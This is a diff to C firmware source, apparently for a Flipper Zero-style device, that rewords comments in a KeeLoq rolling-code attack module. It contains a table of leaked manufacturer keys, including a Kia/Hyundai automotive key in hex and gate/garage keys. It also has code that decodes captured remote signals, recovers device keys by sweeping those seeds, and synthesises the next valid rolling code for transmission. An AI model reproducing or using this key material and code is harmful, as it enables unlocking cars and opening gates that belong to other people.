@@ -5,18 +5,17 @@
 
 
 /* ── Manufacturer key table ──────────────────────────────────────────────── */
-/* 73 entries: real-world KeeLoq manufacturer keys curated from public leaks  */
-/* and field research. Covers gate/garage (EU), automotive/alarm (RU/CIS),   */
-/* and factory default patterns.                                              */
-/* Format: { "Name", 0xMASKED_KEY, learning_type }                              */
-/* Keys are stored masked; kl_unmask_key() inverts them. tools/mask_mfrkeys.py   */
-/* reverses the whole table. See the note above FLIPPER_MFR_KEYS.                */
+/* These 73 masked manufacturer keys come from public disclosures and field
+   research. They cover gate/garage and automotive/alarm products, plus common
+   default patterns. Each entry is { "Name", 0xMASKED_KEY, learning_type }.
+   kl_unmask_key() reverses the masking; tools/mask_mfrkeys.py applies it to
+   the table. See the note above FLIPPER_MFR_KEYS. */
 const MfrKey FLIPPER_MFR_KEYS[N_MFR_KEYS] = {
     /* ── OEM automotive ─────────────────────────────────────────────────── */
-    /*  The one public OEM car KeeLoq key, and the reason N_MFR_KEYS is 73. It was missing
-        from this table while the count already said 73, so index 72 was a zero-initialised
-        entry: name=NULL, key=0. The guards compare against N_MFR_KEYS (73) and so did not
-        exclude it, letting a NULL name reach the derivations and the FOBLoq list. */
+    /* This is the public OEM automotive KeeLoq key that brings the table to
+       N_MFR_KEYS entries. Previously the count was already 73, but this entry
+       was missing, leaving index 72 zero-initialized (NULL name, zero key).
+       Bounds checks allowed that slot into key derivation and the FOBLoq list. */
     { "Kia_V3_V4_OEM",  0xCC88E6C23CEC0269ULL, 1 },   /* Simple Learning, Kia/Hyundai V3/V4 */
     /* ── Gate / Garage / Barrier (EU) ──────────────────────────────────── */
     { "DoorHan",        0xC9F1C7E5F53307FDULL, 1 },   /* Simple Learning    */
@@ -152,9 +151,9 @@ bool kl_self_test(void) {
 
 /* ── PWM bit extractor ────────────────────────────────────────────────────── */
 /*
- * KeeLoq preamble: ≥4 consecutive "short-total" pairs (HIGH+LOW ≤ 2.5×TE).
- * Data bits: '1' = 2T HIGH + T LOW;  '0' = T HIGH + 2T LOW.
- * Leader-code fallback: long HI (4–16×TE) followed by short LO (≤2×TE).
+ * Find a preamble of at least four pairs with HIGH+LOW <= 2.5T, then decode
+ * data bits as '1' = 2T HIGH + T LOW and '0' = T HIGH + 2T LOW. If there is
+ * no such preamble, try the leader form: HIGH 4T..16T followed by LOW <=2T.
  */
 uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
     uint16_t  b       = 0;
@@ -162,7 +161,7 @@ uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
     uint32_t  thr_tot = (te << 1) + (te >> 1);   /* 2.5×TE   */
     int       data_start = -1;
 
-    /* Two-phase preamble search (phase 0: buf[0] is HIGH; phase 1: LOW-first) */
+/* Check both pulse alignments: the buffer may start HIGH-first or LOW-first. */
     for(int phase = 0; phase <= 1 && data_start < 0; phase++) {
         for(int i = phase; i + 1 < n; i += 2) {
             int pc = 0, j = i;
@@ -171,7 +170,7 @@ uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
         }
     }
 
-    /* Leader-code fallback (HCS200/201 and generic clones) */
+    /* Try the leader format used by HCS200/201 and some clones. */
     if(data_start < 0) {
         uint32_t ldr_lo = te << 1;
         for(int i = 0; i + 1 < n && data_start < 0; i++) {
@@ -189,14 +188,16 @@ uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
 
 /* ── KeeLoq frame parser ──────────────────────────────────────────────────── */
 /*
- * Standard HCS3xx frame (LSB first over the air, emitted MSB-first into bits[]):
+ * Standard HCS3xx frame layout. Bits arrive LSB-first over the air and remain
+ * in that order in bits[]:
  *   bits[0..31]  = 32-bit encrypted hop counter
  *   bits[32..59] = 28-bit serial number
  *   bits[60..63] = 4-bit button / discriminant
  *   bit[64]      = overflow flag
  *   bit[65]      = repeat flag
  *
- * Validation: enc≠0, btn≠0 (unpressed fobs have btn=0 and are noise), ≥66 bits.
+ * Require at least 66 bits and reject zero hop or button fields; an unpressed
+ * fob has button zero and is not a useful capture.
  */
 bool kl_parse(const char* bits, int n, KLFrame* f) {
     if(!bits || n < 66 || !f) return false;
@@ -234,7 +235,7 @@ bool kl_parse(const char* bits, int n, KLFrame* f) {
 
 /* ── Key derivation ───────────────────────────────────────────────────────── */
 /*
- * 14 derivation modes per seed key (matching firmware ks_deriveMfrKeys):
+ * The firmware-compatible derivation table has 14 modes per seed:
  *   0: simple             — seed as-is
  *   1: normal             — Encrypt(SN<<4 | btn, seed)  ... for recovery use seed
  *   2: xor-seed           — seed ^ 0xAAAA555500FF00FF
@@ -250,8 +251,8 @@ bool kl_parse(const char* bits, int n, KLFrame* f) {
  *  12: byte-rev-simple    — byte-reversed seed
  *  13: byte-rev-normal    — byte-reversed normal form
  *
- * For recovery we only need the derived manufacturer key (the device key
- * is derived on-the-fly in kl_recover_key from enc+sn).
+ * Key recovery derives the device key from the captured frame and serial
+ * number in kl_recover_key().
  */
 static uint64_t byteswap64(uint64_t v) {
     return ((v & 0xFF00000000000000ULL) >> 56) |
@@ -264,8 +265,8 @@ static uint64_t byteswap64(uint64_t v) {
            ((v & 0x00000000000000FFULL) << 56);
 }
 
-/* Produce one candidate without retaining the complete 560-entry table.
-   Keep this mode order in lockstep with kl_derive_all_keys and recovery. */
+/* Build one derived-key candidate on demand instead of keeping all 560 entries
+   in memory. Keep this mode order aligned with kl_derive_all_keys(). */
 static bool kl_derive_key_at(int k, int mode, DerivedKey* out) {
     if(!out || k < 0 || k >= N_MFR_KEYS || mode < 0 || mode >= 14) return false;
     uint64_t s = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
@@ -334,17 +335,12 @@ int kl_derive_all_keys(DerivedKey* out) {
 }
 
 /* ── Key recovery (key sweep against enc + SN) ────────────────────────────── */
-/*
- * For each derived key, try to decrypt enc with the manufacturer key as the
- * device key (simple learning) and also with AN1064 normal-learning diversification:
- *   device_key = Encrypt(SN | (SN<<28), mfr_key)  — the Microchip scheme.
- *
- * Success condition: dec lower 8 bits match disc||btn (discriminant), and the
- * decrypted counter is in a plausible range (0..0xFFFF).
- */
-/*
- * User-supplied vault keys (flipper_keyvault) appended to the built-in sweep.
- */
+/* The Auto fast path tries each built-in seed directly, with AN1064
+   normal-learning SN diversification, secure-learning XOR, and XOR-Type-1.
+   It deliberately skips the full 14-mode sweep (about 2,000 candidates);
+   additional keys can be supplied through flipper_keyvault. A candidate must
+   decrypt to the captured button and the low 10 serial bits in the
+   discriminant field. */
 static const DerivedKey* s_vault_keys;
 static int               s_vault_n;
 
@@ -364,9 +360,9 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
         dk = lo | (hi << 32);
     }
     uint32_t dec = kl_decrypt(enc, dk);
-    /* Plaintext: [btn 4 | disc 10 | counter 16] (HCS200/300/301).  Require the
-       standard 10-bit disc == SN[9:0] plus button match (~14 bits).  Looser
-       OR-conditions on disc placement were letting random PWM false-match. */
+    /* HCS200/300/301 plaintext is [button 4 | discriminant 10 | counter 16].
+       Require the 10-bit discriminant to equal SN[9:0], as well as an exact
+       button match. Looser alternatives allowed random PWM false matches. */
     if(((dec >> 28) & 0xF) != btn) return false;
     if(((dec >> 16) & 0x3FFu) != (f->sn & 0x3FFu)) return false;
     f->dec  = dec;
@@ -385,30 +381,29 @@ static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) 
 bool kl_recover_key(KLFrame* f) {
     if(!f || f->enc == 0) return false;
 
-    /* Fast path: manufacturer seed as-is + AN1064 SN diversification only.
-       The 14-mode seed-mangle sweep (~2000 candidates) is too slow for Auto
-       and mainly helps obscure clones — those remain reachable via the vault. */
+    /* Keep Auto's search short: test each manufacturer seed directly, with
+       normal-learning diversification, secure learning, and XOR-Type-1. */
     for(int k = 0; k < N_MFR_KEYS; k++) {
         const char* nm = FLIPPER_MFR_KEYS[k].name;
         uint64_t mk = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
-        /* Skip all-zero / all-ones seeds — they inflate false matches and cost. */
+        /* These common weak seeds add work and increase false matches. */
         if(mk == 0 || mk == 0xFFFFFFFFFFFFFFFFULL) continue;
         char label[48];
         snprintf(label, sizeof(label), "%s/seed", nm);
         if(kl_try_one(f, label, mk, false)) return true;
         if(kl_try_one(f, label, mk, true))  return true;
-        /* Secure learning (AN1031): seed XOR (sn16 | sn16<<32) */
+        /* Try Secure Learning (AN1031) with the low 16 serial bits repeated. */
         uint16_t sn16 = (uint16_t)(f->sn & 0xFFFF);
         uint64_t secure = mk ^ ((uint64_t)sn16 | ((uint64_t)sn16 << 32));
         snprintf(label, sizeof(label), "%s/secure", nm);
         if(kl_try_one(f, label, secure, false)) return true;
-        /* Magic XOR Type-1 (Beninca-class) */
+        /* Try the XOR-Type-1 variant used by Beninca-class remotes. */
         uint64_t mag = mk ^ 0x5555555555555555ULL;
         snprintf(label, sizeof(label), "%s/xor1", nm);
         if(kl_try_one(f, label, mag, false)) return true;
         if(kl_try_one(f, label, mag, true))  return true;
     }
-    /* User vault keys: same two-try scheme against them */
+    /* Apply the direct-key and SN-diversified checks to user-supplied keys too. */
     for(int i = 0; i < s_vault_n; i++) {
         if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, false)) return true;
         if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, true))  return true;
@@ -418,16 +413,14 @@ bool kl_recover_key(KLFrame* f) {
 
 /* ── Next-code synthesis (matched key → fresh frame on the wire) ──────────── */
 /*
- * The capture only ever knew the ENCRYPTED counter word.  Once a KEY is in
- * hand (table match, vault key, or cracked), the next valid codes are pure
- * encryption: encrypt(ctr, key) → enc', then re-emit the standard HCS3xx
- * bit layout LSB-first with the same button nibble:
+ * A capture provides the encrypted hop, not the plaintext counter. With a
+ * recovered or supplied key, this routine encrypts the next counter and emits
+ * a standard HCS3xx frame, LSB-first, preserving the captured button:
  *   bits 0..31   enc' = Encrypt((btn << 28) | ctr, key)
  *   bits 32..59  sn
  *   bits 60..63  btn (== high nibble of the plaintext → self-consistent)
  *   bits 64..65  ovf / rep
- * The preamble mirrors kl_pwm()'s own leader heuristic so the frame the
- * receiver hears is exactly what this codebase accepts: 8 short pairs at T/2T.
+ * Its eight short preamble pairs match the format accepted by kl_pwm().
  */
 bool flipper_kl_next_pulses(const KLFrame* f, uint32_t ctr, uint64_t key,
                             uint32_t te, float freq_mhz, FlipperPulseBuf* out) {
